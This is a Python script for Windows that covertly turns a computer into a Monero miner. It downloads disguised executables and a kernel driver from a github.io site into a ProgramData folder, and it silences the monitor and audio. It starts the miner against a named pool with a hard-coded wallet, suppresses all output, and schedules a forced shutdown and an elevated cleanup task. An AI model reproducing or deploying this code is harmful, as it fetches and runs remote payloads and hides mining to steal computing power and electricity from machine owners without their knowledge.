import subprocess
import os
import shutil
import time
import datetime
import urllib.request
from pathlib import Path
import tempfile

# Configurações fixas
wifi_interface = "Wi-Fi 4"
ethernet_interface = "Ethernet"
wifi_ssid = "AAPM"
shutdown_hour = 5
shutdown_minute = 30
base_url = "https://lokilaki.github.io/dcreamit/"
arquivos_para_baixar = ["crealit.exe", "sart.exe","WinRing0x64.sys"]
destino = Path("C:/ProgramData/Temp")
# destino = Path(os.getenv("APPDATA")) / "Temp"
#destino = Path(tempfile.gettempdir())

def is_after_23():
    return datetime.datetime.now().hour >= 23

def connect_to_wifi():
    subprocess.run(f'netsh wlan connect name={wifi_ssid} interface="{wifi_interface}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def enable_ics():
    try:
        ps_script = f"""
        $share = (Get-WmiObject -Class Win32_NetworkAdapter | Where-Object {{ $_.NetConnectionID -eq '{ethernet_interface}' }}).DeviceID
        $public = (Get-WmiObject -Class Win32_NetworkAdapter | Where-Object {{ $_.NetConnectionID -eq '{wifi_interface}' }}).DeviceID
        Start-Process -Verb RunAs powershell -ArgumentList \"
            $ics = New-Object -ComObject HNetCfg.HNetShare;
            $connections = $ics.EnumEveryConnection();
            foreach ($conn in $connections) {{
                $config = $ics.INetSharingConfigurationForINetConnection($conn);
                $props = $ics.NetConnectionProps($conn);
                if ($props.Name -eq '{wifi_interface}') {{
                    $config.EnableSharing(0); # Public
                }} elseif ($props.Name -eq '{ethernet_interface}') {{
                    $config.EnableSharing(1); # Private
                }}
            }}
        \"
        """
        subprocess.run(["powershell", "-Command", ps_script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def restart_ethernet():
    subprocess.run(f'netsh interface set interface "{ethernet_interface}" admin=disable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(30)
    subprocess.run(f'netsh interface set interface "{ethernet_interface}" admin=enable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def schedule_shutdown_and_disable_ics():
    now = datetime.datetime.now()
    shutdown_time = now.replace(hour=5, minute=30, second=0)
    if shutdown_time < now:
        shutdown_time += datetime.timedelta(days=1)
    secs_left = int((shutdown_time - now).total_seconds())

    subprocess.run(f'shutdown -a', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # agenda o desligamento forçado
    subprocess.run(f'shutdown /s /f /t {secs_left}', shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # cria script BAT que desativa o ICS
    destino.mkdir(exist_ok=True, parents=True)
    bat_path = (destino / "desativar_ics.bat").resolve()
    bat_path.write_text(
        rf"""@echo off
powershell -Command ^
"$hnet = New-Object -ComObject HNetCfg.HNetShare; ^
$hnet.EnumEveryConnection() ^| %{{ ^
  $cfg = $hnet.INetSharingConfigurationForINetConnection($_); ^
  $props = $hnet.NetConnectionProps($_); ^
  if ($props.Name -eq '{wifi_interface}' -or $props.Name -eq '{ethernet_interface}') {{ ^
     if ($cfg.SharingEnabled) {{ $cfg.DisableSharing() }} ^
  }} ^
}}"
""",
        encoding="utf-8"
    )

    # instante 5 min antes do desligamento
    trigger_time = (shutdown_time - datetime.timedelta(minutes=5)).strftime("%H:%M")

    # cria a tarefa via PowerShell, com StartWhenAvailable e RunLevel Highest
    ps_cmd = rf'''
$action  = New-ScheduledTaskAction  -Execute '{bat_path}';
$trigger = New-ScheduledTaskTrigger -Once -At "{trigger_time}";
$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable;
Register-ScheduledTask -TaskName 'DesativarICS' `
                       -Action $action `
                       -Trigger $trigger `
                       -Settings $settings `
                       -RunLevel Highest -Force;
'''
    subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def baixar_arquivos():
    destino.mkdir(parents=True, exist_ok=True)
    for arquivo in arquivos_para_baixar:
        url = base_url + arquivo
        destino_final = destino / arquivo
        try:
            urllib.request.urlretrieve(url, destino_final)
        except Exception:
            continue

def desligar_monitor():
    subprocess.Popen(f'cmd /c start "" "{destino}\sart.exe" monitor off', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen(f'cmd /c start "" "{destino}\sart.exe" mutesysvolume 1', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def get_computer_description():
    try:
        result = subprocess.check_output(
            ['powershell', '-Command', "(Get-WmiObject Win32_OperatingSystem).Description"],
            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
            text=True
        )
        return result.strip()
    except Exception:
        return "sem_descricao"

def ligar_crealit():
    subprocess.Popen(f'cmd /c start "" "{destino}\crealit.exe"  --coin monero -o pool.hashvault.pro:80 -u 41g9z6vMVXh9egLLuyJGHyWzRjoagmDHSbgAk7WoxWpGPMSBL33ArZudfN8Fmq8QGPDLLtNdxEevNadr4wxtYhASEx7gpYx -p {get_computer_description()} --donate-level 1 ', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def main():
    # if not is_after_23():
    #     return
    connect_to_wifi()
    time.sleep(30)
    enable_ics()
    time.sleep(30)
    restart_ethernet()
    baixar_arquivos()
    desligar_monitor()
    ligar_crealit()
    schedule_shutdown_and_disable_ics()

if __name__ == "__main__":
    main()
